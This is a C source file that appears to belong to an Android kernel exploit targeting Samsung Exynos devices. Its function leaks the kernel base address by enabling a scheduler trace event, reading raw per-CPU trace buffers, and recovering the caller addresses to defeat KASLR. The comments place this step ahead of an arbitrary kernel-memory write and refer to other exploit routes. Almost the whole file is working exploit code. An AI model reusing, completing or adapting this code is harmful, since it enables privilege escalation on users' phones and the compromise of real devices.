#include "common.h"
#include "tracefs_records.h"
#include "tracefs_guard.h"

/* Samsung's shell route discovers the image slide through tracefs records,
 * before any arbitrary kernel-memory write is attempted. Sampling changes
 * tracing controls and consumes raw records; it is not filesystem read-only.
 * Keep this
 * separate from the removed APK-only boot-id/pselect calibration code. */
static int tracefs_write_str(const char *path, const char *s) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(s);
  ssize_t w = write(fd, s, len);
  close(fd);
  return w == (ssize_t)len;
}

static int tracefs_read_uint(const char *path, unsigned int *value) {
  FILE *f = fopen(path, "r");
  if (!f) return 0;
  int ok = fscanf(f, "%u", value) == 1;
  fclose(f);
  return ok;
}

int tracefs_leak_kernel_base(uint64_t *out) {
  if (!out) {
    return 0;
  }
  const char *trace_root = "/sys/kernel/tracing";
  char path[256], enable_path[256], tracing_path[256];
  unsigned int event_id_want = 0;
  snprintf(path, sizeof(path), "%s/events/sched/sched_blocked_reason/id", trace_root);
  if (!tracefs_read_uint(path, &event_id_want)) {
    trace_root = "/sys/kernel/debug/tracing";
    snprintf(path, sizeof(path), "%s/events/sched/sched_blocked_reason/id", trace_root);
    if (!tracefs_read_uint(path, &event_id_want)) {
      pr_warning("tracefs leak: cannot read runtime sched_blocked_reason event id\n");
      return 0;
    }
  }
  if (event_id_want == 0 || event_id_want > UINT16_MAX) return 0;
  /* Reject unfamiliar record layouts before interpreting caller bytes. */
  snprintf(path, sizeof(path), "%s/events/sched/sched_blocked_reason/format", trace_root);
  FILE *format = fopen(path, "r");
  int caller_layout_ok = 0;
  if (format) {
    char line[512];
    while (fgets(line, sizeof(line), format)) {
      char *offset = strstr(line, "offset:");
      char *size = strstr(line, "size:");
      unsigned int off = 0, sz = 0;
      if (strstr(line, " caller;") && offset && size &&
          sscanf(offset, "offset:%u", &off) == 1 &&
          sscanf(size, "size:%u", &sz) == 1 && off == 16 && sz == 8)
        caller_layout_ok = 1;
    }
    fclose(format);
  }
  if (!caller_layout_ok) {
    pr_warning("tracefs leak: caller format is unavailable or incompatible\n");
    return 0;
  }
  snprintf(enable_path, sizeof(enable_path),
           "%s/events/sched/sched_blocked_reason/enable", trace_root);
  snprintf(tracing_path, sizeof(tracing_path), "%s/tracing_on", trace_root);
  unsigned int saved_tracing = 0, saved_enabled = 0;
  if (!tracefs_read_uint(tracing_path, &saved_tracing) || saved_tracing > 1 ||
      !tracefs_read_uint(enable_path, &saved_enabled) || saved_enabled > 1) {
    pr_warning("tracefs leak: cannot save tracing controls; refusing to change them\n");
    return 0;
  }
  if (active_offsets->diagnostic_only) {
    snprintf(path, sizeof(path), "%s/trace", trace_root);
    FILE *trace = fopen(path, "r");
    char header[2048] = {0};
    if (trace) {
      fread(header, 1, sizeof(header) - 1, trace);
      fclose(trace);
    }
    if (!tracefs_diagnostic_can_sample(saved_tracing, saved_enabled, header)) {
      pr_warning("G985F preflight requires inactive tracing and an empty buffer; "
                 "existing trace was left untouched\n");
      return 0;
    }
  }
  pr_info("tracefs runtime event id=%u root=%s\n", event_id_want, trace_root);
  uint64_t caller_off =
    (active_offsets && active_offsets->tracefs_caller_off)
      ? active_offsets->tracefs_caller_off : 0xdb1a0ULL;

  int found = 0;
  int matching_cpus = 0, conflicting_candidates = 0;
  uint64_t result = 0;
  /* Stop -> enable -> sample -> stop -> read -> restore controls. */
  if (!tracefs_write_str(tracing_path, "0")) {
    pr_warning("tracefs leak: tracing_on write failed (perm?)\n");
    goto restore;
  }
  if (!tracefs_write_str(enable_path, "1")) {
    pr_warning("tracefs leak: event enable write failed (perm?)\n");
    goto restore;
  }
  /* Legacy diagnostics never truncate the buffer themselves. */
  if (!active_offsets->diagnostic_only) {
    snprintf(path, sizeof(path), "%s/trace", trace_root);
    int tfd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC);
    if (tfd >= 0) close(tfd);
  }
  if (!tracefs_write_str(tracing_path, "1")) {
    pr_warning("tracefs leak: tracing restart failed\n");
    goto restore;
  }
  if (active_offsets->rt_sigreturn_route) {
    /* The fresh Exynos boot can be completely idle for the old one-second
     * sample and yield no sched_blocked_reason records.  The already-safe
     * FUSE-backed signal carrier creates bounded uninterruptible waits and
     * reliably wakes several kworkers at worker_thread+0x348.  It performs no
     * kernel-memory write and doubles as the required route-carrier preflight. */
    if (!rt_sigreturn_fault_selftest()) {
      pr_warning("tracefs leak: Exynos activity trigger failed\n");
      (void)tracefs_write_str(tracing_path, "0");
      goto restore;
    }
  } else {
    sleep(1);
  }
  if (!tracefs_write_str(tracing_path, "0")) {
    pr_warning("tracefs leak: failed to stop sampling\n");
    goto restore;
  }

  long ncpu = sysconf(_SC_NPROCESSORS_CONF);
  for (int cpu = 0; cpu < ncpu && (active_offsets->diagnostic_only || !found); cpu++) {
    snprintf(path, sizeof(path),
             "%s/per_cpu/cpu%d/trace_pipe_raw", trace_root, cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      if (active_offsets->diagnostic_only)
        pr_warning("tracefs leak: cpu%d raw page open failed: %s\n", cpu, strerror(errno));
      continue;
    }
    int cpu_matched = 0;
    unsigned char buf[4096];
    ssize_t n;
    while ((active_offsets->diagnostic_only || !found) &&
           (n = read(fd, buf, sizeof(buf))) > 0) {
      uint64_t candidate = 0;
      if (!tracefs_scan_page(buf, (size_t)n, (uint16_t)event_id_want,
          caller_off, KIMAGE_TEXT_BASE,
          active_offsets->kaslr_max_slide ? active_offsets->kaslr_max_slide : 0x1f0000ULL,
          active_offsets->kaslr_slide_alignment ? active_offsets->kaslr_slide_alignment : 0x10000ULL,
          &candidate)) continue;
      if (!found) { result = candidate; found = 1; }
      if (candidate != result) conflicting_candidates = 1;
      if (!cpu_matched && candidate == result) { matching_cpus++; cpu_matched = 1; }
    }
    close(fd);
  }
  if (active_offsets->diagnostic_only && (matching_cpus < 2 || conflicting_candidates)) {
    pr_warning("tracefs diagnostic candidate requires agreement on at least two CPUs "
               "(matched=%d conflicting=%d)\n", matching_cpus, conflicting_candidates);
    found = 0;
  }
restore:;
  /* Restore on failures as well as success, including partial setup. */
  int enabled_restored = tracefs_write_str(enable_path, saved_enabled ? "1" : "0");
  int tracing_restored = tracefs_write_str(tracing_path, saved_tracing ? "1" : "0");
  if (!enabled_restored || !tracing_restored) {
    pr_warning("tracefs leak: could not restore tracing controls\n");
    return 0;
  }
  if (!found) {
    pr_warning("tracefs leak: no confirmed record matched caller, range and alignment\n");
    return 0;
  }
  if (result < KIMAGE_TEXT_BASE ||
      result - KIMAGE_TEXT_BASE >
        (active_offsets->kaslr_max_slide ? active_offsets->kaslr_max_slide : 0x1f0000ULL)) {
    pr_warning("tracefs leak: implausible base=%016llx\n",
               (unsigned long long)result);
    return 0;
  }
  *out = result;
  if (active_offsets->diagnostic_only)
    pr_info("tracefs diagnostic candidate agreed on %d CPUs; controls restored\n", matching_cpus);
  return 1;
}
